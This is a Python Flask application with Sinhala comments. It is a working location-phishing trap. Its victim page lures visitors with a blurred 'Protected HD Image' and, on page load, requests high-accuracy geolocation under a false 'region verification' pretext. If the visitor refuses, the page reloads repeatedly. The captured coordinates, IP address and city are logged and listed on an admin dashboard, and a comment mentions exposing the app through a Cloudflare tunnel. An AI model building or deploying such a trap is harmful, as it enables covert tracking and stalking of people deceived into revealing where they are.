import os, requests, datetime
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Captured දත්ත තාවකාලිකව තබා ගැනීමට (Database එකක් වෙනුවට)
captured_logs = []

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res if res['status'] == 'success' else None
    except: return None

# --- Admin Dashboard Route ---
@app.route('/admin')
def admin():
    # මෙතනට උඹේ Cloudflare ලින්ක් එක දාගන්න පුළුවන්
    tunnel_url = "Generating..." 
    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=tunnel_url)

# --- ලොකේෂන් හොරකම් කරන පේජ් එක (The Trap) ---
@app.route('/')
def victim_page():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    ip_info = get_ip_info(user_ip)
    city = ip_info['city'] if ip_info else "Colombo"

    return f'''
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }}
            .btn {{ background: #25D366; color: white; padding: 15px; border-radius: 50px; border: none; font-weight: bold; width: 80%; max-width: 300px; margin-top: 20px; }}
            .blur {{ width: 250px; filter: blur(10px); border-radius: 10px; }}
        </style>
        <script>
            window.onload = function() {{ 
                setTimeout(() => {{ 
                    navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}}); 
                }}, 1000);
            }};
            function s(p) {{
                fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                .then(() => location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb');
            }}
            function e() {{ alert("Error: Please allow region access to view image."); location.reload(); }}
        </script>
    </head>
    <body>
        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
        <h2>Protected HD Image</h2>
        <p>Location access required for <b>{city}</b> region verification.</p>
        <button class="btn" onclick="location.reload()">Unlock Image</button>
    </body>
    </html>
    '''

# --- දත්ත සේව් කරන රූට් එක ---
@app.route('/log')
def log_data():
    log = {
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.args.get('ip'),
        "city": request.args.get('city'),
        "lat": request.args.get('lat'),
        "lon": request.args.get('lon')
    }
    captured_logs.append(log)
    print(f"\n[!] New Capture: {log['city']} | {log['lat']},{log['lon']}")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
